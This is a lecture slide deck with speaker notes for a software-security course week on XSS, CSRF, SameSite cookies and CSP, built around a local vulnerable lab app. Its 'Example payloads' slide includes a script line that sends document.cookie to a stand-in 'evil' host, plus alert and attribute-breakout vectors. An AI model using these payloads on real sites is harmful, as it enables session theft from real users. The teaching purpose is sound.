---
marp: true
theme: default
paginate: true
header: "Software Security · Week 5"
---

# Week 5
## XSS & Client-Side Risks
Software Security · Nutthakorn Chalaemwongwan

<!-- Hook: pop an alert(1) on a real site clone, then show the same payload exfiltrating a cookie. "XSS is injection that runs in YOUR browser, as the site you trust." ~2 min. -->

---

## Today

- The browser security model
- XSS: reflected / stored / DOM
- CSRF + SameSite cookies
- Content Security Policy (CSP)
- 🎮 Game: **XSS Golf**

<!-- Roadmap, 1 min. Frame: last week injection hit the server (SQL); this week it hits the client (the DOM). Same root cause, different interpreter (the browser). -->

---

## Recap — Week 4

- Injection = data interpreted as code
- Parameterized queries fix SQLi
- Same idea returns today — in the browser

<!-- 1-min bridge. The interpreter today is the browser's HTML/JS parser. Ask: "what was the one fix for SQLi?" then say: the XSS analogue is context-aware output encoding. -->

---

## Browser security model

- **Same-Origin Policy (SOP):** scripts only read data from same origin
- Origin = scheme + host + port
- Cookies, DOM, storage scoped per origin

<!-- Foundational — XSS is dangerous precisely because injected script runs INSIDE the origin, so SOP protects the attacker's code, not you. Give an origin example: https://a.com:443 vs http://a.com differ. ~5 min. -->

---

## XSS = injection into the page

> Attacker JavaScript runs in the victim's browser, in the site's origin.

- Steal cookies/sessions, keylog, rewrite the page, pivot
- Maps to **OWASP A05:2025 Injection** (output side)

<!-- Drive home: because the script runs as the site, it can do anything the user can. List concrete harms. "Output side" = the bug is in how we render data, not how we store it. ~4 min. -->

---

## Three flavors of XSS

| Type | Where the payload lives |
|---|---|
| **Reflected** | in the request, echoed back |
| **Stored** | saved server-side, served to others |
| **DOM** | client-side JS writes untrusted data to the DOM |

- Today's graded app (`vulnerable_app.py`) implements **reflected + stored only**; DOM XSS is optional, via the ungraded Juice Shop target

<!-- Go row by row with an example each: reflected = malicious link; stored = a comment that attacks every viewer (worst); DOM = `location.hash` written to innerHTML. Ask which is most dangerous and why (stored — hits everyone). Be clear DOM isn't part of today's graded tasks. ~6 min. -->

---

## Example payloads

```html
<script>fetch('//evil/'+document.cookie)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

- Context matters: HTML body vs attribute vs JS vs URL
- `vulnerable_app.py` filters **nothing** — every payload here fires as-is; the `<img onerror>` form isn't "the one that sneaks past a filter," it's just **3 characters longer** than `<script>alert(1)</script>` (28 vs. 25) — a real golf trade-off, not a bypass technique

<!-- These are the XSS Golf payloads. There's no filter in this app to explain a bypass for — correct that instinct if it comes up. The context point (HTML body vs attribute vs JS vs URL) is still the real learning; `">` breaks out of an attribute first. ~6 min. -->

---

## Try it — one value, four sinks

The same input, landing in an HTML text node, an unquoted attribute, an
`href="…"`, and a `<script>` string — at once. Pick an escaper, see which sinks it actually protects.

```sim
xss-context
```

<!-- Live payoff for "context matters" — one escaper is right for some of the 4 sinks and wrong for others, computed live rather than asserted (3 verdicts: EXECUTES / BROKEN / SAFE — a wrecked script tag is not "safe" either). Ties straight into the Defenses slide's "encode per context." ~4 min. -->

---

## CSRF — riding the user's session

- Browser auto-sends cookies → attacker forges a state-changing request
- Real defenses: **anti-CSRF tokens**, checking Origin/Referer, **and the endpoint actually checking who's asking**
- `SameSite=Strict` alone stops the cookie from *attaching* cross-site — it does **not** stop a request from being *accepted* if the endpoint never checks authorization in the first place (today's lab proves this)

<!-- Contrast with XSS: CSRF needs no script on the page — it abuses the browser auto-attaching cookies. Example: a hidden form that POSTs a comment. Don't let "SameSite fixes CSRF" stand unqualified — this week's own fixed_app.py sets SameSite=Strict+HttpOnly+Secure and the CSRF PoC still works, because /comments never checks a session or token at all. ~5 min. -->

---

## Same cookie, opposite directions

![Two stacked panels comparing stored XSS with CSRF, using the same attacker/server/victim actors. Stored XSS: attacker posts a script, the victim loads it, it runs in the victim's origin and steals the cookie (no HttpOnly) — fixed by output encoding, not SameSite, since the payload is already same-origin. CSRF: the victim visits the attacker's page, which auto-submits a form; the browser attaches the cookie itself and the server can't tell the victim never meant to send it — fixed by SameSite plus a CSRF token the server actually checks, not HttpOnly, since no script ever reads the cookie.](img/xss-and-csrf.svg)

<!-- The step-by-step version of the bullets just covered — walk both panels left to right once. Land on the footnote: fixed_app.py kills the XSS but the CSRF still works, because encoding an output and checking a token are two unrelated fixes. ~4 min. -->

---

## Real-world: British Airways (2018)

- Attackers injected malicious JS (Magecart) into BA's site/app
- Script **skimmed credit-card details** as users typed
- ~380k payment records skimmed; ICO proposed a £183M fine, **finalized at £20M** (2020, ~89% reduction)

> Client-side injection = real money + real fines.

<!-- Make it real. Magecart = the keylogging harm from 2 slides ago, at scale, on a Fortune-500 checkout. Note it often enters via a compromised third-party script — which motivates CSP next. ~3 min. -->

---

## CWE mapping

- **CWE-79** — Cross-site scripting
- **CWE-352** — CSRF
- **CWE-1004** — cookie set without `HttpOnly` (this week's cookie-theft task)

<!-- Quick reference for the worksheet — these three are what's graded this week. Clickjacking (CWE-1021) isn't part of this lab; don't cite it here. ~1 min. -->

---

## Defenses

- **Output encoding** per context (HTML/attr/JS/URL)
- Framework auto-escaping (don't bypass with `innerHTML`/`dangerouslySetInnerHTML`)
- **Content Security Policy** — a defense-in-depth *header*, set alongside escaping — it doesn't replace it
- `HttpOnly` + `SameSite` cookies; anti-CSRF tokens **and an endpoint that actually checks who's asking**

<!-- The payoff. #1: encode for the OUTPUT CONTEXT (the bug is on output). Modern frameworks auto-escape — the danger is when devs opt out (innerHTML). Be accurate about CSP here: this lab's escaping already neutralizes every payload before CSP would ever matter, so students will NOT see a CSP violation fire in the console today — it's set as a header, its blocking behavior is asserted, not demonstrated, in this sandbox. ~6 min. -->

---

## ⛳ Game — XSS Golf

Craft the **shortest** payload that pops `alert(1)` / steals a cookie against `vulnerable_app.py`.

- Solo scoring by character count (no filter to beat — it's a golf exercise, not a bypass race)
- **Defend:** run `fixed_app.py` — same payloads, now escaped — then prove CSRF *still* works against it and explain why

<!-- Explain before lab: this app is local, not Juice Shop; solo, not a bonus-round competition. The real graded turn is running fixed_app.py and showing escaping stops the golf payloads while CSRF still gets through — that contrast is the point. ~3 min. -->

---

## Lab steps

> 📋 **Worksheet 5** — `labs/week05-xss-client-side/worksheet.md` (Part 3) · **kickoff:** `docker compose up` → http://localhost:8080

1. Find reflected + stored XSS in `vulnerable_app.py` (DOM XSS via Juice Shop is optional/ungraded)
2. Demonstrate cookie theft via the stored payload
3. Run `fixed_app.py` — confirm output encoding + CSP now block your XSS payloads
4. Demonstrate CSRF **still succeeds** against `fixed_app.py` — explain why SameSite didn't stop it

<!-- Logistics. Step 4 is the one people get backwards: the defended app still falls to CSRF, on purpose — the lesson is that SameSite protects cookie *attachment*, not request *authorization*. Steps 3-4 (defend) are graded. The weekly quiz no longer asks for their scoring payload/sink/flag (dropped — quiz runs before the lab) — that's required in the worksheet instead. -->

---

## Deliverable

- Each XSS type with payload + context
- Escaping + CSP that blocks them (show before/after)
- Short note: why CSRF still succeeds against `fixed_app.py` despite `SameSite=Strict`
- **+ Audit the AI / EiPE / Prompt Problem** (see worksheet)

<!-- Before/after + the reasoning note — the CSRF note is graded on getting the SameSite-doesn't-equal-authorization distinction right, not on claiming the defense worked. Remind the AI-resilient tasks count. -->

---

## Key takeaways

- XSS is injection on the output side — encode for the context
- CSP is defense-in-depth, not a substitute for encoding
- **SameSite cookies stop the cookie attaching cross-site — they don't stop a request being accepted if the endpoint never checks authorization**

<!-- Recap. Cold-call: "where is the XSS bug — input or output?" (output rendering). Second cold-call: "if SameSite=Strict is set, why did CSRF still work today?" (the endpoint never checked who was asking). ~2 min. -->

---

# Questions?
Next week: Authentication, sessions & access control

<!-- Cliffhanger: "Next week — change one number in a URL and read someone else's data; forge a token and become admin." Remind Juice Shop ready. -->
